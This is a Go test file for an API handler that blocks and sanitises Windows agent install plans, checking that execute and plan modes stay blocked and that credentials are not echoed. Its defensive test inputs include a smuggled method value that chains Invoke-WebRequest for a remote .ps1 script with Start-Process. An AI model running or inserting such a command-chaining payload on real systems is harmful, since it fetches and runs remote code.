package handler

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"ai-workbench-api/internal/model"

	"github.com/gin-gonic/gin"
)

func TestFindXAgentInstallPlanWindowsPowerShellExecuteCreatesBlockedExecution(t *testing.T) {
	gin.SetMode(gin.TestMode)
	resetAgentLifecycleRecordsForTest(t)
	body := strings.NewReader(`{
		"package_id":"host-collector",
		"os":"windows",
		"method":"windows-powershell",
		"mode":"execute",
		"target_ids":["win-target-a"],
		"credential_ref":"<CREDENTIAL_REF>",
		"metadata":{"ticket":"CHG-1","password":"secret"}
	}`)
	w := performAgentLifecyclePost("/api/v1/findx-agents/install-plans", body, CreateFindXAgentInstallPlan)
	if w.Code != http.StatusConflict {
		t.Fatalf("Windows execute mode should stay blocked, got %d body=%s", w.Code, w.Body.String())
	}
	payload := decodeWindowsInstallExecutionPayload(t, w.Body.Bytes())
	if payload.Execution.Status != model.FindXAgentExecutionStatusBlocked ||
		payload.Execution.Runner != "windows-powershell" ||
		payload.Execution.TargetID != "win-target-a" {
		t.Fatalf("expected blocked Windows PowerShell execution, got %#v", payload.Execution)
	}
	for _, want := range []string{"package_repository_ref", "checksum", "executor_ref", "install_root_policy_ref", "install_receipt_ref", "heartbeat_validator_ref", "data_arrival_validator_ref", "audit_ref_or_evidence_chain_ref"} {
		if !strings.Contains(w.Body.String(), want) {
			t.Fatalf("expected missing ref %s in response, body=%s", want, w.Body.String())
		}
	}
	for _, forbidden := range []string{"secret", "token", "<CREDENTIAL_REF>", `"status":"queued"`, `"status":"running"`, `"status":"succeeded"`, `"status":"success"`, `"status":"applied"`, `"status":"rolled-back"`, `"status":"failed"`, `"status":"cancelled"`} {
		if strings.Contains(w.Body.String(), forbidden) {
			t.Fatalf("blocked execution must not expose %s, body=%s", forbidden, w.Body.String())
		}
	}
	assertWindowsInstallSteps(t, payload.Execution.Steps)
	assertNoCredentialEcho(t, w.Body.String())
}

func TestFindXAgentInstallPlanWindowsInvokeWebRequestRequiresPowerShellRef(t *testing.T) {
	gin.SetMode(gin.TestMode)
	resetAgentLifecycleRecordsForTest(t)
	body := strings.NewReader(`{
		"package_id":"host-collector",
		"os":"windows",
		"method":"Invoke-WebRequest -UseBasicParsing",
		"mode":"execute",
		"target_ids":["win-target-a"],
		"metadata":{"package_repository_ref":"repo-ref","audit_ref":"audit-ref"}
	}`)
	w := performAgentLifecyclePost("/api/v1/findx-agents/install-plans", body, CreateFindXAgentInstallPlan)
	if w.Code != http.StatusConflict {
		t.Fatalf("Windows Invoke-WebRequest execute mode should stay blocked, got %d body=%s", w.Code, w.Body.String())
	}
	payload := decodeWindowsInstallExecutionPayload(t, w.Body.Bytes())
	if payload.Execution.Runner != "windows-powershell" {
		t.Fatalf("expected Invoke-WebRequest method to normalize to windows-powershell, got %#v", payload.Execution)
	}
	if !strings.Contains(payload.Execution.ErrorSummary, "powershell_installer_ref") {
		t.Fatalf("expected missing PowerShell installer ref, got %q", payload.Execution.ErrorSummary)
	}
	assertNoCredentialEcho(t, w.Body.String())
}

func TestFindXAgentInstallPlanWindowsCmdCertutilExecuteMissingRefsBlocks(t *testing.T) {
	gin.SetMode(gin.TestMode)
	resetAgentLifecycleRecordsForTest(t)
	body := strings.NewReader(`{
		"package_id":"host-collector",
		"os":"windows",
		"method":"certutil",
		"mode":"execute",
		"target_ids":["win-target-b"],
		"metadata":{"package_repository_ref":"repo-ref","audit_ref":"audit-ref"}
	}`)
	w := performAgentLifecyclePost("/api/v1/findx-agents/install-plans", body, CreateFindXAgentInstallPlan)
	if w.Code != http.StatusConflict {
		t.Fatalf("Windows certutil execute mode should stay blocked, got %d body=%s", w.Code, w.Body.String())
	}
	payload := decodeWindowsInstallExecutionPayload(t, w.Body.Bytes())
	if payload.Execution.Runner != "windows-cmd" {
		t.Fatalf("expected windows-cmd runner, got %#v", payload.Execution)
	}
	if !strings.Contains(payload.Execution.ErrorSummary, "certutil_installer_ref_or_windows_cmd_installer_ref") {
		t.Fatalf("expected missing certutil/windows-cmd ref, got %q", payload.Execution.ErrorSummary)
	}
	assertWindowsInstallSteps(t, payload.Execution.Steps)
	assertNoCredentialEcho(t, w.Body.String())
}

func TestFindXAgentInstallPlanWindowsCmdCertutilExecuteAlwaysBlocksExecutor(t *testing.T) {
	gin.SetMode(gin.TestMode)
	resetAgentLifecycleRecordsForTest(t)
	w := performWindowsCertutilExecutePlan(t)
	payload := decodeWindowsInstallExecutionPayload(t, w.Body.Bytes())
	assertWindowsCertutilExecutionBlocked(t, w.Code, payload.Execution, w.Body.String())
}

func TestFindXAgentInstallPlanWindowsServiceRefsUseServiceScopeAndNeverFakeState(t *testing.T) {
	gin.SetMode(gin.TestMode)
	resetAgentLifecycleRecordsForTest(t)
	w := performWindowsCertutilExecutePlan(t)
	payload := decodeBlockedExecutionMatrixResponse(t, w.Body.String())
	if payload.ReceiptContract.Scope != "windows_service" {
		t.Fatalf("service refs should use windows_service receipt scope, got %#v", payload.ReceiptContract)
	}
	if payload.Status != "blocked" ||
		payload.StateMachine.CurrentState != model.FindXAgentExecutionStateBlockedByContract ||
		payload.SafeToRetry {
		t.Fatalf("Windows service preflight should stay blocked_by_contract and not retryable, got %#v", payload)
	}
	assertWindowsCertutilExecutionBlocked(t, w.Code, payload.Execution, w.Body.String())
	assertNoForbiddenWindowsLifecycleStates(t, w.Body.String())
}

func TestFindXAgentInstallPlanWindowsBlockedResponseSanitizesShellMetadataAndMethod(t *testing.T) {
	gin.SetMode(gin.TestMode)
	resetAgentLifecycleRecordsForTest(t)
	body := strings.NewReader(`{
		"package_id":"host-collector",
		"os":"windows",
		"method":"Invoke-WebRequest https://example.invalid/i.ps1; Start-Process calc",
		"mode":"execute",
		"target_ids":["win-target-c"],
		"metadata":{
			"package_repository_ref":"repo-ref",
			"signature_ref":"sig-ref",
			"checksum":"sha256:abc",
			"script_manifest_ref":"script-manifest-ref",
			"executor_ref":"executor-ref",
			"windows_installer_ref":"installer-ref",
			"powershell_installer_ref":"powershell-installer-ref",
			"service_manifest_ref":"service-ref",
			"install_root_policy_ref":"root-policy-ref",
			"windows_service_name_ref":"service-name-ref",
			"windows_service_policy_ref":"service-policy-ref",
			"service_receipt_ref":"service-receipt-ref",
			"service_status_receipt_ref":"service-status-receipt-ref",
			"install_receipt_ref":"install-receipt-ref",
			"rollback_manifest_ref":"rollback-ref",
			"rollback_receipt_ref":"rollback-receipt-ref",
			"uninstall_manifest_ref":"uninstall-ref",
			"uninstall_receipt_ref":"uninstall-receipt-ref",
			"heartbeat_validator_ref":"heartbeat-validator-ref",
			"data_arrival_validator_ref":"data-arrival-validator-ref",
			"audit_ref":"audit-ref",
			"receiver_endpoint_ref":"receiver-ref",
			"runner":"custom-lab-runner",
			"transport":"custom-lab-runner",
			"custom_runner":"custom-lab-runner",
			"sensitive_marker":"marker-secret",
			"token":"secret"
		}
	}`)
	w := performAgentLifecyclePost("/api/v1/findx-agents/install-plans", body, CreateFindXAgentInstallPlan)
	if w.Code != http.StatusConflict {
		t.Fatalf("Windows suspicious method should stay blocked, got %d body=%s", w.Code, w.Body.String())
	}
	for _, forbidden := range []string{"Start-Process", "custom-lab-runner", "marker-secret", "sensitive_marker", "secret", "token"} {
		if strings.Contains(w.Body.String(), forbidden) {
			t.Fatalf("blocked response must not echo suspicious or sensitive value %q: %s", forbidden, w.Body.String())
		}
	}
	assertNoForbiddenWindowsLifecycleStates(t, w.Body.String())
}

func TestFindXAgentInstallPlanWindowsPlanModeSanitizesShellMetadataAndMethod(t *testing.T) {
	gin.SetMode(gin.TestMode)
	resetAgentLifecycleRecordsForTest(t)
	body := strings.NewReader(`{
		"package_id":"host-collector",
		"os":"windows",
		"method":"Invoke-WebRequest https://example.invalid/i.ps1; Start-Process calc",
		"mode":"plan",
		"target_ids":["win-target-plan"],
		"metadata":{
			"package_repository_ref":"repo-ref",
			"signature_ref":"sig-ref",
			"checksum":"sha256:abc",
			"script_manifest_ref":"script-manifest-ref",
			"executor_ref":"executor-ref",
			"windows_installer_ref":"installer-ref",
			"powershell_installer_ref":"powershell-installer-ref",
			"runner":"custom-lab-runner",
			"transport":"custom-lab-runner",
			"custom_runner":"custom-lab-runner",
			"method":"Invoke-WebRequest https://example.invalid/i.ps1; Start-Process calc",
			"sensitive_marker":"marker-secret"
		}
	}`)
	w := performAgentLifecyclePost("/api/v1/findx-agents/install-plans", body, CreateFindXAgentInstallPlan)
	if w.Code != http.StatusConflict {
		t.Fatalf("Windows plan mode should stay blocked, got %d body=%s", w.Code, w.Body.String())
	}
	payload := decodeWindowsInstallPlanPayload(t, w.Body.Bytes())
	if payload.Data.Method != "" {
		t.Fatalf("Windows plan mode must not echo suspicious method, got %q body=%s", payload.Data.Method, w.Body.String())
	}
	for _, key := range []string{"runner", "transport", "custom_runner", "method", "sensitive_marker"} {
		if value := payload.Data.Metadata[key]; value != "" {
			t.Fatalf("Windows plan mode must not echo metadata[%s]=%q body=%s", key, value, w.Body.String())
		}
	}
	for _, forbidden := range []string{"Start-Process", "custom-lab-runner", "marker-secret", "sensitive_marker"} {
		if strings.Contains(w.Body.String(), forbidden) {
			t.Fatalf("Windows plan mode must not echo forbidden value %q: %s", forbidden, w.Body.String())
		}
	}
	assertWindowsStoredInstallPlanSanitized(t, payload.Data.ID)
	assertNoCredentialEcho(t, w.Body.String())
}

func performWindowsCertutilExecutePlan(t *testing.T) *httptest.ResponseRecorder {
	t.Helper()
	body := strings.NewReader(`{
		"package_id":"host-collector",
		"os":"windows",
		"method":"certutil",
		"mode":"execute",
		"target_ids":["win-target-b"],
		"metadata":{
			"package_repository_ref":"repo-ref",
			"signature_ref":"sig-ref",
			"checksum":"sha256:abc",
			"script_manifest_ref":"script-manifest-ref",
			"executor_ref":"executor-ref",
			"windows_installer_ref":"installer-ref",
			"powershell_installer_ref":"powershell-installer-ref",
			"certutil_installer_ref":"certutil-installer-ref",
			"windows_cmd_installer_ref":"windows-cmd-installer-ref",
			"service_manifest_ref":"service-ref",
			"install_root_policy_ref":"root-policy-ref",
			"windows_service_name_ref":"service-name-ref",
			"windows_service_policy_ref":"service-policy-ref",
			"service_receipt_ref":"service-receipt-ref",
			"service_status_receipt_ref":"service-status-receipt-ref",
			"install_receipt_ref":"install-receipt-ref",
			"rollback_manifest_ref":"rollback-ref",
			"rollback_receipt_ref":"rollback-receipt-ref",
			"uninstall_manifest_ref":"uninstall-ref",
			"uninstall_receipt_ref":"uninstall-receipt-ref",
			"heartbeat_validator_ref":"heartbeat-validator-ref",
			"data_arrival_validator_ref":"data-arrival-validator-ref",
			"audit_ref":"audit-ref",
			"evidence_chain_ref":"evidence-chain-ref",
			"receiver_endpoint_ref":"receiver-ref",
			"token":"secret"
		}
	}`)
	return performAgentLifecyclePost("/api/v1/findx-agents/install-plans", body, CreateFindXAgentInstallPlan)
}

func assertWindowsStoredInstallPlanSanitized(t *testing.T, id string) {
	t.Helper()
	stored := decodeBlockedInstallPlanDetail(t, performAgentLifecycleGet("/api/v1/findx-agents/install-plans?id="+id, ListFindXAgentInstallPlans))
	if stored.Method != "" {
		t.Fatalf("stored Windows plan must not keep suspicious method, got %q", stored.Method)
	}
	for _, key := range []string{"runner", "transport", "custom_runner", "method", "sensitive_marker"} {
		if value := stored.Metadata[key]; value != "" {
			t.Fatalf("stored Windows plan must not keep metadata[%s]=%q", key, value)
		}
	}
}

func assertWindowsCertutilExecutionBlocked(t *testing.T, code int, execution model.FindXAgentInstallExecution, body string) {
	t.Helper()
	if code != http.StatusConflict {
		t.Fatalf("Windows certutil execute mode should stay blocked, got %d body=%s", code, body)
	}
	if execution.Runner != "windows-cmd" {
		t.Fatalf("expected windows-cmd runner, got %#v", execution)
	}
	if execution.ErrorSummary != "BLOCKED_BY_CONTRACT: Windows executor/service lifecycle protocol not enabled" {
		t.Fatalf("executor must remain blocked, got %q", execution.ErrorSummary)
	}
	assertWindowsExecutionStatusBlocked(t, execution)
	assertWindowsCertutilBlockedSteps(t, body)
	assertWindowsCertutilSensitiveValuesHidden(t, body)
	assertWindowsInstallSteps(t, execution.Steps)
	assertNoCredentialEcho(t, body)
}

func assertWindowsExecutionStatusBlocked(t *testing.T, execution model.FindXAgentInstallExecution) {
	t.Helper()
	for _, forbidden := range []string{"succeeded", "success", "queued", "running", "applied", "installed", "service_registered", "heartbeat_seen", "data_arrival_seen", "uninstalled", "rolled-back", "rolled_back", "failed", "cancelled"} {
		if execution.Status == forbidden {
			t.Fatalf("Windows installer must not report %s: %#v", forbidden, execution)
		}
	}
}

func assertWindowsCertutilBlockedSteps(t *testing.T, body string) {
	t.Helper()
	for _, want := range []string{"download_script", "download_package", "verify_signature", "install_files", "register_windows_service", "start_windows_service", "verify_service_status", "verify_heartbeat", "verify_data_arrival", "capture_evidence", "rollback_or_cleanup"} {
		if !strings.Contains(body, want) {
			t.Fatalf("expected blocked chain step %s in response, body=%s", want, body)
		}
	}
}

func assertWindowsCertutilSensitiveValuesHidden(t *testing.T, body string) {
	t.Helper()
	if strings.Contains(body, "secret") || strings.Contains(body, "token") {
		t.Fatalf("blocked execution must not echo sensitive values, body=%s", body)
	}
}

func assertNoForbiddenWindowsLifecycleStates(t *testing.T, body string) {
	t.Helper()
	var raw any
	if err := json.Unmarshal([]byte(body), &raw); err != nil {
		t.Fatalf("decode body for Windows state scan: %v body=%s", err, body)
	}
	for _, field := range []string{"status", "current_state", "state"} {
		for _, value := range collectJSONFieldStrings(raw, field) {
			switch value {
			case "queued", "running", "succeeded", "success", "installed", "applied", "service_registered", "heartbeat_seen", "data_arrival_seen", "uninstalled", "rolled-back", "rolled_back":
				t.Fatalf("blocked Windows gate must not expose fake %s=%s: %s", field, value, body)
			}
		}
	}
}

func decodeWindowsInstallExecutionPayload(t *testing.T, data []byte) struct {
	Data      model.FindXAgentInstallPlan      `json:"data"`
	Execution model.FindXAgentInstallExecution `json:"execution"`
} {
	t.Helper()
	var payload struct {
		Data      model.FindXAgentInstallPlan      `json:"data"`
		Execution model.FindXAgentInstallExecution `json:"execution"`
	}
	if err := json.Unmarshal(data, &payload); err != nil {
		t.Fatalf("invalid response: %v", err)
	}
	if payload.Data.ID == "" || payload.Execution.PlanID != payload.Data.ID {
		t.Fatalf("expected execution linked to install plan, got %#v", payload)
	}
	return payload
}

func decodeWindowsInstallPlanPayload(t *testing.T, data []byte) struct {
	Data model.FindXAgentInstallPlan `json:"data"`
} {
	t.Helper()
	var payload struct {
		Data model.FindXAgentInstallPlan `json:"data"`
	}
	if err := json.Unmarshal(data, &payload); err != nil {
		t.Fatalf("invalid response: %v", err)
	}
	if payload.Data.ID == "" {
		t.Fatalf("expected install plan id, got %#v", payload)
	}
	return payload
}

func assertWindowsInstallSteps(t *testing.T, steps []model.FindXAgentInstallExecutionStep) {
	t.Helper()
	want := []string{
		"download_script",
		"download_package",
		"verify_signature",
		"install_files",
		"register_windows_service",
		"start_windows_service",
		"verify_service_status",
		"verify_heartbeat",
		"verify_data_arrival",
		"capture_evidence",
		"rollback_or_cleanup",
	}
	if len(steps) != len(want) {
		t.Fatalf("expected Windows blocked chain steps %#v, got %#v", want, steps)
	}
	for i, name := range want {
		if steps[i].Name != name || steps[i].Status != model.FindXAgentExecutionStatusBlocked {
			t.Fatalf("unexpected step[%d], got %#v", i, steps[i])
		}
	}
}
